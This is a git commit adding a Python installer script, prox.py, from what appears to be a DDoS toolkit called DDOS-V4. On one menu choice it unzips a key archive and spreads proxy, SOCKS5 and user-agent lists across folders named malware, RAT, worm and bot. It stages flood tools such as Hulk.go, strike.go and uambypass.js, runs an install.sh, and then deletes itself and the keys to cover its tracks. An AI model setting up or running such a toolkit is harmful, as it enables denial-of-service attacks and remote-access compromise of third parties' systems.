beebf76a7cbf2607dcdaa38967abacba9cdca0cc
DarkNet403 <142100190+Darknet403@users.noreply.github.com>
2023-11-14 06:46:07 +0700

    Add files via upload

---
+++ prox.py
@@ -0,0 +1,75 @@
+import os
+print("""
+               \033[37m           ,MMM\033[35m8&&&.
+               \033[37m      _...MMMMM\033[35m88&&&&..._
+               \033[37m   .::'''MMMMM8\033[35m8&&&&&&'''::.
+               \033[37m  ::     MMMMM8\033[35m8&&&&&&     ::
+               \033[37m  '::....MMMMM8\033[35m8&&&&&&....::'
+               \033[37m     `''''MMMMM\033[35m88&&&&''''`
+               \033[37m           'MMM\033[35m8&&&'
+""")
+
+print("""\33[0;32m[1] RUN NEW PROXY\n[2] CANCEL\nWhich one do you use?""")
+
+c = input(">>>: ")
+if c == "1":
+    os.system("unzip key.zip")
+    os.system("rm -rf key.zip")
+    os.system("cd && cd DDOS-V4 && cd key && cp proxy.txt /root/DDOS-V4/godzilla")
+    os.system("cd && cd DDOS-V4 && cd key && cp proxies.txt /root/DDOS-V4/godzilla")
+    os.system("cd && cd DDOS-V4 && cd key && cp proxy.txt /root/DDOS-V4/malware")
+    os.system("cd && cd DDOS-V4 && cd key && cp proxies.txt /root/DDOS-V4/randomstring")
+    os.system("cd && cd DDOS-V4 && cd key && cp proxy.txt /root/DDOS-V4/RAT")
+    os.system("cd && cd DDOS-V4 && cd key && cp proxy.txt /root/DDOS-V4/RATC")
+    os.system("cd && cd DDOS-V4 && cd key && cp proxies.txt /root/DDOS-V4/resources")
+    os.system("cd && cd DDOS-V4 && cd key && cp proxy.txt /root/DDOS-V4/resources")
+    os.system("cd && cd DDOS-V4 && cd key && cp http.txt /root/DDOS-V4/resources")
+    os.system("cd && cd DDOS-V4 && cd key && cp socks5.txt /root/DDOS-V4/resources")
+    os.system("cd && cd DDOS-V4 && cd key && cp proxies.txt /root/DDOS-V4/TC1")
+    os.system("cd && cd DDOS-V4 && cd key && cp proxy.txt /root/DDOS-V4/TC1")
+    os.system("cd && cd DDOS-V4 && cd key && cp http.txt /root/DDOS-V4/TC1")
+    os.system("cd && cd DDOS-V4 && cd key && cp socks5.txt /root/DDOS-V4/TC1")
+    os.system("cd && cd DDOS-V4 && cd key && cp proxies.txt /root/DDOS-V4/TC2")
+    os.system("cd && cd DDOS-V4 && cd key && cp proxy.txt /root/DDOS-V4/TC2")
+    os.system("cd && cd DDOS-V4 && cd key && cp http.txt /root/DDOS-V4/TC2")
+    os.system("cd && cd DDOS-V4 && cd key && cp socks5.txt /root/DDOS-V4/TC2")
+    os.system("cd && cd DDOS-V4 && cd key  && cp proxy.txt /root/DDOS-V4/worm")
+    os.system("cd && cd DDOS-V4 && cd key && cp proxy.txt /root/DDOS-V4/wormc")
+    os.system("cd && cd DDOS-V4 && cd key && cp ua.txt /root/DDOS-V4/bot")
+    os.system("cd && cd DDOS-V4 && cd key && cp ua.txt /root/DDOS-V4/godzilla")
+    os.system("cd && cd DDOS-V4 && cd key && cp ua.txt /root/DDOS-V4/malware")
+    os.system("cd && cd DDOS-V4 && cd key && cp user-agent.txt /root/DDOS-V4/randomstring")
+    os.system("cd && cd DDOS-V4 && cd key && cp ua.txt /root/DDOS-V4/RAT")
+    os.system("cd && cd DDOS-V4 && cd key && cp ua.txt /root/DDOS-V4/RATC")
+    os.system("cd && cd DDOS-V4 && cd key && cp ua.txt /root/DDOS-V4/resources")
+    os.system("cd && cd DDOS-V4 && cd key && cp ua.txt /root/DDOS-V4/worm")
+    os.system("cd && cd DDOS-V4 && cd key && cp ua.txt /root/DDOS-V4/wormc")
+    os.system("cd && cd DDOS-V4 && cd key && cp ua.txt /media/")
+    os.system("cd && cd DDOS-V4 && cd key && cp proxies.txt /media/")
+    os.system("cd && cd DDOS-V4 && cd key && cp user-agent.txt /media/")
+    os.system("cd && cd DDOS-V4 && cd key && cp http.txt /media/")
+    os.system("cd && cd DDOS-V4 && cd key && cp socks5.txt /media/")
+    os.system("cd && cd DDOS-V4 && godzilla && cp tls /media/")
+    os.system("cd && cd DDOS-V4 && godzilla && cp tlsv2.js /media/")
+    os.system("cd && cd DDOS-V4 && godzilla && cp HTTP.js /media/")
+    os.system("cd && cd DDOS-V4 && randomstring && cp screetvip /media/")
+    os.system("cd && cd DDOS-V4 && randomstring && cp referers.txt /media/")
+    os.system("cd && cd DDOS-V4 && resources && cp count.js /media/")
+    os.system("cd && cd DDOS-V4 && resources && cp Hulk.go /media/")
+    os.system("cd && cd DDOS-V4 && resources && cp Low.go /media/")
+    os.system("cd && cd DDOS-V4 && resources && cp strike.go /media/")
+    os.system("cd && cd DDOS-V4 && resources && cp uambypass.js /media/")
+    os.system("cd && cd DDOS-V4 && resources && cp install.sh /media/")
+    os.system("cd && cd DDOS-V4 && resources && cp RAW /media/")
+    os.system("cd && cd DDOS-V4 && resources && cp TCP /media/")
+    os.system("cd && cd DDOS-V4 && worm && cp tls-linux /media/")  
+    os.system("cd && cd DDOS-V4 && RAT && cp passkey /media/")
+    os.system("cd && cd DDOS-V4 && bot && cp input.py /media/") 
+    os.system("cd /media && bash install.sh")
+    os.system("cd /root/DDOS-V4 && rm -rf prox.py")      
+    os.system("cd /root/DDOS-V4 && rm -rf key")
+
+elif c == "2":
+    os.system("clear")
+
+print("\33[0;32m[ √ ] S U C C E S S F U L L Y")
